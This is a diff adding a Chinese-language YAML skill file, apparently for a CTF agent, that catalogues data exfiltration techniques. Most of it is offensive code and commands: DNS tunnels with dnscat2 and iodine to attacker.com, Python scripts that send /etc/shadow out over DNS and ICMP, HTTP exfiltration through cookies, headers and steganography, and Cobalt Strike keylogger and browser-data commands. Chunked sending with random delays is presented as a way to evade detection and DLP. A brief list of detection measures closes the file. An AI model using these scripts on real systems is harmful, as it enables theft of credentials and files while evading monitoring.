@@ -1,0 +1,537 @@
+name: data_exfiltration
+description: 数据外带技术 - 涵盖DNS隧道、ICMP隧道、HTTP隐蔽通道、分阶段传输、数据伪装等隐蔽数据传输技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [exfiltration, dns-tunnel, icmp-tunnel, covert-channel, data-transfer]
+priority: medium
+
+# 使用场景
+scenarios:
+  - 受限网络环境数据传输
+  - 绕过DLP系统数据外带
+  - 防火墙严格环境通信
+  - 隐蔽C2数据传输
+  - 敏感数据分段提取
+
+# 核心技术
+techniques:
+  - DNS隧道: 通过DNS协议传输数据
+  - ICMP隧道: 通过ICMP包传输数据
+  - HTTP隐蔽通道: HTTP协议伪装传输
+  - 分段传输: 数据分段隐蔽传输
+  - 数据伪装: 将数据伪装成合法内容
+  - Steganography: 信息隐藏技术
+
+# 工具列表
+tools:
+  - dnscat2: DNS隧道工具
+  - iodine: DNS隧道
+  - Dnsmux: DNS隐蔽通信
+  - ICMP Tunnel: ICMP隧道工具
+  - ptunnel: ICMP隧道
+  - Cobalt Strike: C2隐蔽通道
+  - Metasploit: 数据外带模块
+  - Exfiltration-Testing: DLP测试工具
+
+# DNS隧道技术
+dns_tunneling:
+  - basic_concept:
+    description: |
+      # DNS隧道原理
+
+      # DNS是几乎总是被允许出站的协议
+      # 通过DNS查询/响应传输数据
+
+      # 数据编码方式:
+      # 1. 子域名编码: data.attacker.com
+      # 2. TXT记录编码: 在TXT响应中传输
+      # 3. CNAME记录编码: 通过CNAME传输
+
+      # 工作流程:
+      # 客户端 -> DNS查询(data.target.com) -> DNS服务器
+      # DNS服务器 -> 转发到攻击者DNS -> 返回响应
+      # 响应中携带数据/指令
+
+  - dnscat2_usage:
+    template: |
+      # dnscat2 DNS隧道
+
+      # 1. 服务器端 (攻击者DNS服务器)
+      ruby dnscat2.rb --dns "port=53,domain=attacker.com" --no-cache
+
+      # 2. 客户端 (目标机器)
+      ./dnscat --dns domain=attacker.com
+
+      # 3. dnscat2命令
+
+      # 查看会话
+      sessions
+
+      # 选择会话
+      session -i 1
+
+      # 执行命令
+      exec whoami
+      exec cat /etc/shadow
+
+      # 下载文件
+      download /etc/passwd
+
+      # 上传文件
+      upload payload.exe
+
+      # Shell交互
+      shell
+
+      # 4. 通过DNS传输文件
+      # 分段编码传输
+
+  - iodine_usage:
+    template: |
+      # iodine DNS隧道
+
+      # 特点: 创建虚拟网络接口
+
+      # 1. 服务器端
+      iodined -f -c -P password 10.0.0.1 attacker.com
+
+      # 2. 客户端
+      iodine -f -P password attacker_dns attacker.com
+
+      # 3. 连接后创建虚拟接口
+      # 本地: 10.0.0.2
+      # 远程: 10.0.0.1
+
+      # 4. 通过虚拟接口通信
+      ssh root@10.0.0.1
+      nmap -sT 10.0.0.1
+
+      # 5. 数据传输
+      # 通过虚拟IP直接传输
+
+  - dnsmux_usage:
+    template: |
+      # Dnsmux - DNS隐蔽通信
+
+      # 1. 创建服务器
+      python dnsmux.py server -d attacker.com -p 53
+
+      # 2. 客户端连接
+      python dnsmux.py client -d attacker.com
+
+      # 3. 传输文件
+      send_file /etc/shadow
+      recv_file downloaded_file
+
+  - dns_exfiltration_script:
+    template: |
+      # DNS数据外带Python脚本
+
+      import dns.resolver
+      import base64
+
+      class DNSExfiltrator:
+          def __init__(self, domain):
+              self.domain = domain
+              self.chunk_size = 30  # DNS标签限制
+
+          def encode_data(self, data):
+              """Base32编码(避免特殊字符)"""
+              return base64.b32encode(data).decode()
+
+          def send_chunk(self, chunk, seq):
+              """发送单个DNS查询"""
+              query = f"{seq}.{chunk}.{self.domain}"
+              try:
+                  dns.resolver.resolve(query, 'A')
+                  return True
+              except:
+                  return False
+
+          def exfiltrate_file(self, filepath):
+              """外带文件"""
+              with open(filepath, 'rb') as f:
+                  data = f.read()
+
+              encoded = self.encode_data(data)
+              chunks = [encoded[i:i+self.chunk_size]
+                        for i in range(0, len(encoded), self.chunk_size)]
+
+              for seq, chunk in enumerate(chunks):
+                  self.send_chunk(chunk, seq)
+                  print(f"Sent chunk {seq}/{len(chunks)}")
+
+      # 使用
+      exfil = DNSExfiltrator("attacker.com")
+      exfil.exfiltrate_file("/etc/shadow")
+
+  - dns_server_listener:
+    template: |
+      # DNS服务器监听脚本
+
+      import socket
+      import base64
+
+      class DNSListener:
+          def __init__(self, port=53):
+              self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+              self.sock.bind(('0.0.0.0', port))
+              self.received_chunks = {}
+
+          def parse_dns_query(self, data):
+              """解析DNS查询"""
+              # 解析DNS头部和问题部分
+              # 提取查询域名中的数据
+
+              # 假设格式: seq.data.attacker.com
+              domain_parts = extract_domain(data)
+              if len(domain_parts) >= 3:
+                  seq = int(domain_parts[0])
+                  chunk = domain_parts[1]
+                  return seq, chunk
+              return None, None
+
+          def run(self):
+              """监听DNS请求"""
+              while True:
+                  data, addr = self.sock.recvfrom(512)
+                  seq, chunk = self.parse_dns_query(data)
+
+                  if chunk:
+                      self.received_chunks[seq] = chunk
+                      print(f"Received chunk {seq}: {chunk[:20]}...")
+
+                      # 检查是否完成
+                      self.check_complete()
+
+                  # 发送DNS响应
+                  response = self.build_response(data)
+                  self.sock.sendto(response, addr)
+
+          def check_complete(self):
+              """检查数据是否完整"""
+              # 根据序列号判断完整性
+              # 重组数据
+
+# ICMP隧道技术
+icmp_tunneling:
+  - basic_concept:
+    description: |
+      # ICMP隧道原理
+
+      # ICMP (ping) 通常被允许出站
+      # 在ICMP Echo Request/Reply的数据部分传输
+
+      # 结构:
+      # ICMP Header (8 bytes) + Data Payload
+
+      # 可以在Data部分携带任意数据
+      # 通常用于小数据量传输
+
+  - ptunnel_usage:
+    template: |
+      # ptunnel ICMP隧道
+
+      # 1. 服务器端 (攻击者机器)
+      ./ptunnel -p password
+
+      # 2. 客户端 (目标机器)
+      ./ptunnel -p password -da attacker_ip -dp 22
+
+      # 3. 通过ICMP隧道SSH
+      ssh -p 2222 user@localhost
+
+      # 宧户端创建本地端口2222
+      # 通过ICMP转发到攻击者的22端口
+
+  - icmp_exfiltration_script:
+    template: |
+      # ICMP数据外带Python脚本
+
+      import socket
+      import struct
+      import base64
+
+      class ICMPExfiltrator:
+          def __init__(self, target_ip):
+              self.target = target_ip
+              self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+
+          def build_icmp_packet(self, data, seq):
+              """构建ICMP包"""
+              # ICMP头部
+              type = 8  # Echo Request
+              code = 0
+              checksum = 0
+              id = 0x1234
+
+              header = struct.pack('!BBHHH', type, code, checksum, id, seq)
+
+              # 计算校验和
+              checksum = self.calculate_checksum(header + data)
+              header = struct.pack('!BBHHH', type, code, checksum, id, seq)
+
+              return header + data
+
+          def calculate_checksum(self, data):
+              """计算ICMP校验和"""
+              if len(data) % 2:
+                  data += b'\x00'
+              s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
+              while s >> 16:
+                  s = (s >> 16) + (s & 0xffff)
+              return ~s & 0xffff
+
+          def send_data(self, data):
+              """发送数据"""
+              encoded = base64.b64encode(data)
+              chunk_size = 64
+
+              for seq, chunk in enumerate(encoded[i:i+chunk_size]
+                                          for i in range(0, len(encoded), chunk_size)):
+                  packet = self.build_icmp_packet(chunk, seq)
+                  self.sock.sendto(packet, (self.target, 0))
+
+      # 使用
+      exfil = ICMPExfiltrator("attacker.com")
+      exfil.send_data(b"sensitive data")
+
+# HTTP隐蔽通道
+http_covert_channel:
+  - basic_concept:
+    description: |
+      # HTTP隐蔽通道
+
+      # 利用HTTP协议特征传输数据:
+      # 1. URL参数隐藏
+      # 2. Cookie隐藏
+      # 3. Header隐藏
+      # 4. POST Body隐藏
+      # 5. Chunked编码
+      # 6. 图片隐写
+
+  - url_parameter_encoding:
+    template: |
+      # URL参数编码
+
+      import requests
+      import base64
+
+      def exfil_via_url(target, data):
+          """通过URL参数外带"""
+          # 编码数据
+          encoded = base64.urlsafe_b64encode(data).decode()
+
+          # 分段传输
+          chunk_size = 50
+          for i, chunk in enumerate([encoded[j:j+chunk_size]
+                                      for j in range(0, len(encoded), chunk_size)]):
+              # 伪装成正常参数
+              url = f"{target}/search?q=test&d={chunk}&s={i}"
+              requests.get(url)
+
+      # 接收端从URL参数提取数据
+
+  - cookie_encoding:
+    template: |
+      # Cookie编码传输
+
+      import requests
+      import base64
+
+      def exfil_via_cookie(target, data):
+          """通过Cookie外带"""
+          encoded = base64.b64encode(data).decode()
+
+          # 设置Cookie
+          cookies = {
+              'session': 'normal_session_id',
+              'data': encoded[:100],  # 第一部分
+              'd2': encoded[100:200],  # 第二部分
+          }
+
+          requests.get(target, cookies=cookies)
+
+  - header_encoding:
+    template: |
+      # HTTP Header编码
+
+      import requests
+      import base64
+
+      def exfil_via_header(target, data):
+          """通过Header外带"""
+          encoded = base64.b64encode(data).decode()
+
+          headers = {
+              'User-Agent': f'Mozilla/5.0 {encoded[:50]}',
+              'X-Forwarded-For': f'192.168.1.1, {encoded[50:100]}',
+              'Referer': f'{target}/{encoded[100:150]}',
+              'X-Custom-Data': encoded[150:200],
+          }
+
+          requests.get(target, headers=headers)
+
+  - steganography_image:
+    template: |
+      # 图片隐写外带
+
+      # 在图片中隐藏数据
+
+      import PIL.Image as Image
+
+      def hide_data_in_image(image_path, data, output_path):
+          """LSB隐写"""
+          img = Image.open(image_path)
+          pixels = img.load()
+
+          # 将数据编码到像素LSB
+          binary_data = ''.join(format(byte, '08b') for byte in data)
+
+          data_index = 0
+          for i in range(img.width):
+              for j in range(img.height):
+                  if data_index < len(binary_data):
+                      r, g, b = pixels[i, j]
+                      # 修改LSB
+                      r = (r & ~1) | int(binary_data[data_index])
+                      data_index += 1
+                      if data_index < len(binary_data):
+                          g = (g & ~1) | int(binary_data[data_index])
+                          data_index += 1
+                      if data_index < len(binary_data):
+                          b = (b & ~1) | int(binary_data[data_index])
+                          data_index += 1
+                      pixels[i, j] = (r, g, b)
+
+          img.save(output_path)
+
+      # 上传图片到目标
+      requests.post(target, files={'image': open(output_path, 'rb')})
+
+# Cobalt Strike数据外带
+cobalt_strike_exfil:
+  - template: |
+      # Cobalt Strike数据外带
+
+      # Beacon命令
+
+      # 1. 下载文件
+      beacon> download C:\Users\admin\Documents\secret.txt
+
+      # 2. 批量下载
+      beacon> downloads
+      beacon> download C:\*.docx
+
+      # 3. 截屏外带
+      beacon> screenshot
+
+      # 4. 屏幕截图外带
+      beacon> screenwatch
+
+      # 5. 键盘记录外带
+      beacon> keylogger start
+
+      # 6. 浏览器数据
+      beacon> browser_data
+
+      # 7. 配置隐蔽通道
+      # Malleable C2 Profile配置
+      # 修改HTTP请求/响应格式
+
+# 分段传输策略
+chunked_transfer:
+  - template: |
+      # 分段传输策略
+
+      # 1. 小数据量分段
+
+      def chunked_exfil(data, chunk_size=100, delay=5):
+          """分段外带"""
+          chunks = [data[i:i+chunk_size]
+                    for i in range(0, len(data), chunk_size)]
+
+          for i, chunk in enumerate(chunks):
+              # 发送分段
+              send_chunk(chunk, i)
+              # 等待避免触发检测
+              sleep(delay + random.randint(0, 10))
+
+      # 2. 时间分散
+
+      # 在不同时间发送不同分段
+      # 模拟正常用户行为
+
+      # 3. 不同协议混合
+
+      # DNS -> HTTP -> ICMP 混合传输
+      # 降低单一协议流量特征
+
+      # 4. 随机顺序
+
+      # 分段随机顺序发送
+      # 接收端根据序号重组
+
+# 数据伪装
+data_disguise:
+  - template: |
+      # 数据伪装技术
+
+      # 1. JSON伪装
+      def disguise_as_json(data):
+          encoded = base64.b64encode(data).decode()
+          return json.dumps({
+              "status": "success",
+              "data": {
+                  "user": "normal",
+                  "value": encoded  # 隐藏数据
+              }
+          })
+
+      # 2. XML伪装
+      def disguise_as_xml(data):
+          encoded = base64.b64encode(data).decode()
+          return f'''<?xml version="1.0">
+          <response>
+              <status>OK</status>
+              <content>{encoded}</content>
+          </response>'''
+
+      # 3. Base64伪装为Cookie
+      # 4. 嵌入PDF/Word文档
+      # 5. ZIP压缩加密
+
+# 防御检测
+detection:
+  - DNS隧道检测:
+      - 监控DNS查询长度异常
+      - 检测高频DNS查询
+      - 分析DNS查询内容特征
+      - 监控TXT记录异常
+
+  - ICMP隧道检测:
+      - 监控ICMP包大小异常
+      - 检测ICMP频率异常
+      - 分析ICMP数据内容
+
+  - HTTP隐蔽通道检测:
+      - 监控HTTP流量异常
+      - 检测非标准User-Agent
+      - 分析Header内容异常
+      - 检测图片流量模式
+
+  - 防御建议:
+      - 实施严格的DNS监控
+      - 限制ICMP出站
+      - DLP系统部署
+      - 流量行为分析
+      - 数据分类标记
+
+# 参考资源
+references:
+  - https://github.com/iagox86/dnscat2
+  - https://github.com/yarrick/iodine
+  - https://github.com/espes/ptunnel
+  - https://attack.mitre.org/techniques/T1041/
+  - https://attack.mitre.org/techniques/T1048/
+  - https://www.hackingarticles.in/dns-tunneling-iodine/
